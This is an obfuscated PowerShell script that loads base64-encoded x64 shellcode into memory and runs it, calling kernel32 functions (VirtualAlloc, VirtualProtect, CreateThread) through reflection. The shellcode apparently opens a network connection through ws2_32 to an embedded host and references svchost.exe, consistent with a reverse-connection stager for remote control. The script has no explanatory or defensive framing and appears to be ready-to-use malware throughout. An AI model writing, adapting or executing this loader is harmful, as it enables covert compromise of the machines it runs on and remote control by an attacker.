function rBy {
        Param ($cF9, $h0_)
        $ay = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $ay.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($ay.GetMethod('GetModuleHandle')).Invoke($null, @($cF9)))), $h0_))
}

function gw {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $w0,
                [Parameter(Position = 1)] [Type] $r2Wi_ = [Void]
        )

        $ocQ = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ocQ.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $w0).SetImplementationFlags('Runtime, Managed')
        $ocQ.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $r2Wi_, $w0).SetImplementationFlags('Runtime, Managed')

        return $ocQ.CreateType()
}

[Byte[]]$sK = [System.Convert]::FromBase64String("/OjBAAAAQVFBUFJRVkgx0mVIi1JgSItSGEiLUiBIi3JQSA+3SkpNMclIMcCsPGF8AiwgQcHJDUEBweLtUkFRSItSIItCPEgB0IuAiAAAAEiFwHRoSAHQUItIGESLQCBJAdBn41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF111hEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpVv///11IgcRw/v//SI1MJDBBurFKa7H/1emTAAAAXmoASI28JCABAABXSI1MJGBRSDHJUVFoBAAACFFJiclJichIifJBunnMP4b/1UiFwA+EcgAAAGpAScfBABAAAE2JyEgx0kiLD0G6roeSP//VSInDVEnHwf4BAADrRkFYSInCSIsPQbrF2L3n/9VIMclRUVFJidlJichIiw9Busasmnn/1UgxyUj/yUG6RPA14P/V6Gj///9zdmNob3N0LmV4ZQDotf////xIg+Tw6MwAAABBUUFQUkgx0lFWZUiLUmBIi1IYSItSIE0xyUgPt0pKSItyUEgxwKw8YXwCLCBBwckNQQHB4u1SQVFIi1Igi0I8SAHQZoF4GAsCD4VyAAAAi4CIAAAASIXAdGdIAdCLSBhQRItAIEkB0ONWTTHJSP/JQYs0iEgB1kgxwEHByQ2sQQHBOOB18UwDTCQIRTnRddhYRItAJEkB0GZBiwxIRItAHEkB0EGLBIhIAdBBWEFYXllaQVhBWUFaSIPsIEFS/+BYQVlaSIsS6Uv///9dSb53czJfMzIAAEFWSYnmSIHsoAEAAEmJ5Um8AgAOzcYNOINBVEmJ5EyJ8UG6THcmB//VTInqaAEBAABZQbopgGsA/9VqCkFeUFBNMclNMcBI/8BIicJI/8BIicFBuuoP3+D/1UiJx2oQQVhMieJIiflBupmldGH/1YXAdApJ/8515eiTAAAASIPsEEiJ4k0xyWoEQVhIiflBugLZyF//1YP4AH5VSIPEIF6J9mpAQVloABAAAEFYSInySDHJQbpYpFPl/9VIicNJicdNMclJifBIidpIiflBugLZyF//1YP4AH0oWEFXWWgAQAAAQVhqAFpBugsvDzD/1VdZQbp1bk1h/9VJ/87pPP///0gBw0gpxkiF9nW0Qf/nWGoAWUnHwvC1olb/1Q==")
[Uint32]$pR1 = 0
$zER6A = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((rBy kernel32.dll VirtualAlloc), (gw @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $sK.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($sK, 0, $zER6A, $sK.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((rBy kernel32.dll VirtualProtect), (gw @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($zER6A, [Uint32]$sK.Length, 0x10, [Ref]$pR1)) -eq $true) {
        $zt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((rBy kernel32.dll CreateThread), (gw @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$zER6A,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((rBy kernel32.dll WaitForSingleObject), (gw @([IntPtr], [Int32]))).Invoke($zt,0xffffffff) | Out-Null
}
